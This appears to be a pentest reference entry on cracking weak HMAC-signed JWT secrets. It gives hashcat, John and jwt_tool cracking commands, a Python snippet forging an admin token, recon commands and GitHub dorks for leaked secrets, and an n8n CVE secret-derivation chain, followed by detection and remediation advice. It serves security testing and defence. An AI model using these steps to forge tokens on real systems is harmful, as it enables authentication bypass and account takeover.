# JWT Weak Secret Brute-Force

**Category:** JWT Vulnerabilities / Cryptographic Weakness
**Severity:** High to Critical
**Last Updated:** 2026-02-04

## Attack Description

When JWTs are signed with HMAC algorithms (HS256/HS384/HS512) using weak, short, or common secrets, attackers can brute-force or dictionary-attack the secret offline. Once recovered, the attacker can forge arbitrary tokens — achieving full authentication bypass, privilege escalation, and impersonation.

This is a **fully offline attack** — no interaction with the target server during cracking.

## Prerequisites

- Target uses HMAC-based JWT signing (HS256, HS384, HS512)
- Secret is weak: dictionary word, short string, default value, or common pattern
- Attacker has captured at least one valid JWT

## Exploitation Steps

### Step 1: Capture a valid JWT
Any authenticated request, API response, cookie, or URL parameter.

### Step 2: Identify the algorithm
```bash
echo "<header_b64>" | base64 -d
# → {"alg":"HS256","typ":"JWT"}
```
If `alg` is HS256/HS384/HS512 → proceed with brute-force.

### Step 3: Brute-force with hashcat
```bash
# JWT mode in hashcat = 16500
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

# With rules for mutations
hashcat -m 16500 -a 0 jwt.txt wordlist.txt -r rules/best64.rule
```

### Step 4: Brute-force with John the Ripper
```bash
echo "<full_jwt_token>" > jwt.txt
john --wordlist=/path/to/wordlist.txt jwt.txt
john --show jwt.txt  # Display cracked secret
```

### Step 5: Brute-force with jwt_tool
```bash
python3 jwt_tool.py <JWT> -C -d /path/to/wordlist.txt
```

### Step 6: Forge tokens with recovered secret
```python
import jwt
token = jwt.encode(
    {"sub": "admin", "role": "superadmin"},
    "recovered_secret",
    algorithm="HS256"
)
```

## Common Weak Secrets (Testing Priority)

| Category | Examples |
|----------|----------|
| **Defaults** | `secret`, `password`, `jwt_secret`, `changeme`, `test` |
| **Framework defaults** | `your-256-bit-secret` (jwt.io), `super-secret-key`, `my_secret_key` |
| **Short strings** | Any string < 32 characters |
| **Company-related** | Company name, product name, domain name |
| **Environment vars** | `JWT_SECRET`, `SECRET_KEY`, `AUTH_SECRET` |
| **UUIDs** | Guessable if using sequential UUIDs |
| **Hardcoded in source** | Check JS bundles, GitHub repos, config files |

## Secret Discovery (Beyond Brute-Force)

Before brute-forcing, check for leaked secrets:

### Client-Side Exposure
```bash
# Search JavaScript bundles
curl -s https://target.com/main.js | grep -i "secret\|jwt\|token\|sign"

# Source maps
curl -s https://target.com/main.js.map | grep -i secret
```

### GitHub Leaks
```
# GitHub dorks
"target.com" jwt_secret
"target.com" JWT_SECRET_KEY
org:targetorg "secret" extension:env
```

### Config File Leaks
- `.env` files exposed via misconfigured web servers
- `config.json`, `settings.py`, `application.yml` in backup files
- Docker environment variables in accidentally exposed compose files

### n8n-Style Token Forge Chain (CVE-2026-21858)
Real-world pattern from workflow automation stacks:
1. Leak app encryption key from config file
2. Leak user table (email, password_hash, user_id) from backup/DB
3. Derive signing secret: `jwt_secret = sha256(encryption_key[::2])`
4. Derive per-user hash: `jwt_hash = b64(sha256(f"{email}:{password_hash}"))`
5. Forge session cookie with derived secret

## Detection Method

### As a Pentester
1. Capture JWT, confirm HMAC algorithm
2. Run hashcat/john with common wordlists
3. Check client-side JS for hardcoded secrets
4. GitHub dork for leaked secrets
5. Check for `.env` file exposure
6. Time the brute-force — if cracked in < 1 hour, it's reportable

### As a Defender
- Monitor for JWT tokens with unexpected claim values
- Implement rate limiting on auth endpoints (won't prevent offline attack)
- Log and alert on privilege escalation patterns

## Remediation

1. **Use strong secrets** — minimum 256 bits of entropy for HS256
   ```bash
   # Generate proper secret
   openssl rand -hex 32  # 256 bits
   openssl rand -base64 64  # 512 bits
   ```
2. **Prefer asymmetric algorithms** — RS256/ES256 eliminate brute-force risk entirely
3. **Never hardcode secrets** — use environment variables from secure vaults
4. **Rotate secrets periodically** — and invalidate old tokens
5. **Secret scanning** — use tools like truffleHog, gitleaks in CI/CD

## Real-World Examples

### 1. jwt.io Default Secret in Production
- **Secret:** `your-256-bit-secret` (the jwt.io example default)
- **Frequency:** Surprisingly common — developers copy-paste from docs
- **Impact:** Full token forgery

### 2. CVE-2026-21858 — n8n Token Forge Chain
- **Target:** n8n workflow automation platform
- **Flaw:** JWT secret derivable from leaked config + DB data
- **Chain:** Config leak → DB leak → derive secret → forge admin JWT
- **Impact:** Full admin takeover
- **Source:** https://github.com/Chocapikk/CVE-2026-21858

### 3. Bug Bounty: JWT Secret in JavaScript Bundle
- **Target:** SaaS platform
- **Discovery:** `JWT_SECRET=MyAppSecret123` found in minified JS
- **Impact:** Client-side JWT validation + forgeable tokens
- **Payout:** $5,000+

### 4. Multiple Platforms — Empty String Secret
- **Pattern:** Developer sets `JWT_SECRET=""` in development, deploys to production
- **Detection:** Sign token with empty string, check if accepted
- **Impact:** Equivalent to `none` algorithm bypass

## Web3 Context

- **DeFi portfolio trackers** often use simple JWT auth with weak HMAC secrets
- **NFT marketplace APIs** — weak secrets expose user collections, bid data
- **Web3 SaaS analytics** — JWT secret in `.env` leaked via misconfigured Vercel/Netlify
- **Bridge dashboards** — admin JWT forgery → modify bridge parameters
- **Attack pattern:** GitHub recon on Web3 project → find hardcoded JWT secret → forge admin token → access internal API

## Performance Notes

| Tool | Speed (HS256) | Notes |
|------|---------------|-------|
| hashcat (GPU) | ~1B/sec | RTX 4090, fastest option |
| john (CPU) | ~1M/sec | Good for quick checks |
| jwt_tool | ~50K/sec | Convenient but slow |
| jwt-cracker | ~100K/sec | Node.js, brute-force mode |

With hashcat on modern GPU, 8-character alphanumeric secrets crackable in hours.

## References

- HackTricks JWT Brute-Force: https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
- Red Sentry JWT 2026 Guide: https://redsentry.com/resources/blog/jwt-vulnerabilities-list-2026-security-risks-mitigation-guide
- CVE-2026-21858 (n8n): https://github.com/Chocapikk/CVE-2026-21858
- jwt_tool: https://github.com/ticarpi/jwt_tool
